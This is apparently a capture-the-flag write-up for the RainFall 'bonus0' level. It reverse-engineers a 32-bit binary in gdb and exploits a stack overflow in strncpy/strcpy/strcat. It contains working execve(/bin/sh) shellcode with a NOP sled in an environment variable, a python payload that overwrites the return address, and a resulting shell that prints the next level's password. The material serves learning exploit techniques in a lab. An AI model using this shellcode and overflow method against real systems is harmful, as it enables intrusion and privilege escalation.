THe program will display "-", wait for an input, display "-", wait for another input and than print the inputs separated by a space.

Main:
```
   0x080485a4 <+0>:	push   %ebp
   0x080485a5 <+1>:	mov    %esp,%ebp
   0x080485a7 <+3>:	and    $0xfffffff0,%esp
   0x080485aa <+6>:	sub    $0x40,%esp - 64 bytes for loc var
   0x080485ad <+9>:	lea    0x16(%esp),%eax - 64 - 22 = 42 bytes for var
   0x080485b1 <+13>:	mov    %eax,(%esp) - set arg(0x16 (%esp)) for pp call
   0x080485b4 <+16>:	call   0x804851e <pp> 
   0x080485b9 <+21>:	lea    0x16(%esp),%eax
   0x080485bd <+25>:	mov    %eax,(%esp)
   0x080485c0 <+28>:	call   0x80483b0 <puts@plt>
   <16> - <28>: puts(esp+0x16)
   0x080485c5 <+33>:	mov    $0x0,%eax
   0x080485ca <+38>:	leave  
   0x080485cb <+39>:	ret  
```
pp:
```
   0x0804851e <+0>:	push   %ebp
   0x0804851f <+1>:	mov    %esp,%ebp
   0x08048521 <+3>:	push   %edi
   0x08048522 <+4>:	push   %ebx
   0x08048523 <+5>:	sub    $0x50,%esp - 80 bytes local var
   0x08048526 <+8>:	movl   $0x80486a0,0x4(%esp) - "-" as 2nd arg
   0x0804852e <+16>:	lea    -0x30(%ebp),%eax - load buf[20] in eax
   0x08048531 <+19>:	mov    %eax,(%esp) - eax 1 arg 
   0x08048534 <+22>:	call   0x80484b4 <p>
   p(buf, "-")
   0x08048539 <+27>:	movl   $0x80486a0,0x4(%esp)
   0x08048541 <+35>:	lea    -0x1c(%ebp),%eax - load buf2[20] in eax
   0x08048544 <+38>:	mov    %eax,(%esp)
   0x08048547 <+41>:	call   0x80484b4 <p>
   p(buf2, "-")
   0x0804854c <+46>:	lea    -0x30(%ebp),%eax - eax = buf
   0x0804854f <+49>:	mov    %eax,0x4(%esp) 
   0x08048553 <+53>:	mov    0x8(%ebp),%eax - argv[1]
   0x08048556 <+56>:	mov    %eax,(%esp)
   0x08048559 <+59>:	call   0x80483a0 <strcpy@plt>
   <46> - <59>: strcpy(argv[1], buf);
   0x0804855e <+64>:	mov    $0x80486a4,%ebx - ebx = " "
   0x08048563 <+69>:	mov    0x8(%ebp),%eax -eax = argv[1]
   0x08048566 <+72>:	movl   $0xffffffff,-0x3c(%ebp)
   0x0804856d <+79>:	mov    %eax,%edx - edx = eax
   0x0804856f <+81>:	mov    $0x0,%eax - eax = 0
   0x08048574 <+86>:	mov    -0x3c(%ebp),%ecx - ecx = -1
   0x08048577 <+89>:	mov    %edx,%edi - edi = eax
   0x08048579 <+91>:	repnz scas %es:(%edi),%al
   repeat while not zero, scan string
   it will search for the value of %al(0) in %edi
   it will decrement ecx by 1 each iteration
   0x0804857b <+93>:	mov    %ecx,%eax
   0x0804857d <+95>:	not    %eax - it will unsign ecx - 1 for the least significant bit
   0x0804857f <+97>:	sub    $0x1,%eax - subtracts 1 from the lenght prob for "\0" or "\n"
   <91> - <97>: would be equivalent to a strlen
   0x08048582 <+100>:	add    0x8(%ebp),%eax - eax = argv[1] + 1
   0x08048585 <+103>:	movzwl (%ebx),%edx - edx = 32
   
   Breakpoint 2, 0x08048588 in pp ()
(gdb) info r
eax            0xbffff626	-1073744346
ecx            0xffffffee	-18
edx            0x20	32

   0x08048588 <+106>:	mov    %dx,(%eax) *eax = " "
   0x0804858b <+109>:	lea    -0x1c(%ebp),%eax - eax = buf2
   0x0804858e <+112>:	mov    %eax,0x4(%esp)
   0x08048592 <+116>:	mov    0x8(%ebp),%eax
   0x08048595 <+119>:	mov    %eax,(%esp)
   0x08048598 <+122>:	call   0x8048390 <strcat@plt>
   <109> - <122>: strcat(argv[1], buf2);
   0x0804859d <+127>:	add    $0x50,%esp
   0x080485a0 <+130>:	pop    %ebx
   0x080485a1 <+131>:	pop    %edi
   0x080485a2 <+132>:	pop    %ebp
   0x080485a3 <+133>:	ret   
```
p:
```
   0x080484b4 <+0>:	push   %ebp
   0x080484b5 <+1>:	mov    %esp,%ebp
   0x080484b7 <+3>:	sub    $0x1018,%esp - 4120 bytes for local var
   0x080484bd <+9>:	mov    0xc(%ebp),%eax - exa = argv[2]
   0x080484c0 <+12>:	mov    %eax,(%esp)
   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
   <9>-<15>: set args for puts
   0x080484c8 <+20>:	movl   $0x1000,0x8(%esp) - 4096 bytes for 3rd arg
   0x080484d0 <+28>:	lea    -0x1008(%ebp),%eax - 4104 bytes for buffer
   0x080484d6 <+34>:	mov    %eax,0x4(%esp) - move buffer as 2nd arg
   0x080484da <+38>:	movl   $0x0,(%esp) - stdin as 1st arg
   0x080484e1 <+45>:	call   0x8048380 <read@plt>
   read(0, buffer, 4096);
   0x080484e6 <+50>:	movl   $0xa,0x4(%esp) - 10 - 2nd arg
   0x080484ee <+58>:	lea    -0x1008(%ebp),%eax -eax = buffer[4104]
   0x080484f4 <+64>:	mov    %eax,(%esp) - eax - 1st arg
   0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
   0x080484fc <+72>:	movb   $0x0,(%eax) - *eax = 0
   <50> - <72>: *strchr(buffer, 10)= 0;
   0x080484ff <+75>:	lea    -0x1008(%ebp),%eax - eax = buffer
   0x08048505 <+81>:	movl   $0x14,0x8(%esp) - 20 3rd arg
   0x0804850d <+89>:	mov    %eax,0x4(%esp) - eax - 2nd arg
   0x08048511 <+93>:	mov    0x8(%ebp),%eax - argv[1]
   0x08048514 <+96>:	mov    %eax,(%esp) - argv[1] - 1st arg
   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
   strncpy(argv[1], buffer, 20);
   0x0804851c <+104>:	leave  
   0x0804851d <+105>:	ret   
```
First let's try a bigger input as the program will read 4096 of our input, even if stncpy will copy only the first 20bytes.
https://wiremask.eu/tools/buffer-overflow-pattern-generator/ (overflow buffer generator)
```
Starting program: /home/user/bonus0/bonus0 
 - 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0
 - 
Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0
Aa0Aa1Aa2Aa3Aa4Aa5AaAd1Ad2Ad3Ad4Ad5Ad6Ad��� Ad1Ad2Ad3Ad4Ad5Ad6Ad���

Program received signal SIGSEGV, Segmentation fault.
```
It seams that it will get the first 20 bytes of the first input and than fill in the buffer with the second input.
The thing about strncpy is that it will not add a '\0' at the end if the input is bigger than the given size and strcpy will copy until it meet a NULL terminator.
Now we know that buf and buf2 are placed next to eachother in memory (ebp-28 and ebp-48).
Now we have 40 bytes of data from the copying of strcpy() (no null termination for strncpy so it will copy buf2 as well) + 1 byte (character " ") + 20 bytes from strcat(), that will give us 61 bytes we are trying to fit in a 42 byte region and as the variable is in main, that gives us 19 potential bytes to overwrite the EIP address (why the segmentation fault on bigger inputs).
```
0x41346441 in ?? ()
(gdb) i r
eax            0x0	0
ecx            0xffffffff	-1
edx            0xb7fd28b8	-1208145736
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff650	0xbffff650
ebp            0x33644132	0x33644132
esi            0x0	0
edi            0x0	0
eip            0x41346441	0x41346441
eflags         0x210286	[ PF SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) p (char[4]) 0x41346441
$5 = "Ad4A"
```
Looking at the index of our pater generator we can see that in the second input at offset 9 the buffer overflow happens.
Now the question is where we place our payload. Typical execve(/bin/sh) payload would be over 20 bytes, so we could try placing the payload in a enviorment variable.
At the same time the address of the enviorment variable can shift a couple of bytes depending on the path of the program, so what we could try is placing a NOP sled (x\90 no operation instruction) so in case of memory shift we have a margin of error before the actual instruction of our payload
```
bonus0@RainFall:/tmp$ export PAYLOAD=$(python -c 'print "\x90" * 100 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
bonus0@RainFall:/tmp$ 
bonus0@RainFall:/tmp$ ./a.out 
0xbffffe0b
bonus0@RainFall:/tmp$ cat getenv.c 
#include <stdio.h>

int main(int ac, char **av, char **env)
{
	printf("%p\n", getenv("PAYLOAD"));
	return 0;
}
bonus0@RainFall:/tmp$ ./a.out 
0xbfffff37
```
Now that we have the address, we will fill in the first buffer, than at an offset of 9 put the address of our payload.
```
bonus0@RainFall:~$python -c 'print "A"*80 + "\n" + "B"*9 + "\x37\xff\xff\xbf" + "\n"' > /tmp/loadfile

(gdb) run < /tmp/loadfile 
Starting program: /home/user/bonus0/bonus0 < /tmp/loadfile
 - 
 - 

Program received signal SIGSEGV, Segmentation fault.
0x080484fc in p ()
```
Segfault after strchr (movb   $0x0,(%eax)) , we will place a breakpoint after the read call and check what actually is being read.
```
(gdb) i r eax
eax            0x6f	111
```
Confirms the fact that the read call takes the entier input, so we could try filling in the entier read buffer (4095 "A" + "n" = 4096) for the first buffer.
```
bonus0@RainFall:~$ python -c 'print "A"*4095 + "\n" + "B"*9 + "\x37\xff\xff\xbf" + "\n"' > /tmp/loadfile

(gdb) run < /tmp/loadfile 
Starting program: /home/user/bonus0/bonus0 < /tmp/loadfile
 - 
 - 
AAAAAAAAAAAAAAAAAAAABBBBBBBBB
                             ��� BBBBBBBBB
                                          ���
[Inferior 1 (process 4457) exited normally]
```
The second buffer is still not full and we are not overflowing yet so we could try ading the remaining bytes
```
bonus0@RainFall:~$ cat /tmp/loadfile - | ./bonus0 
 - 
 - 
AAAAAAAAAAAAAAAAAAAABBBBBBBBBc���BBBBBBB��� BBBBBBBBBc���BBBBBBB���
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```


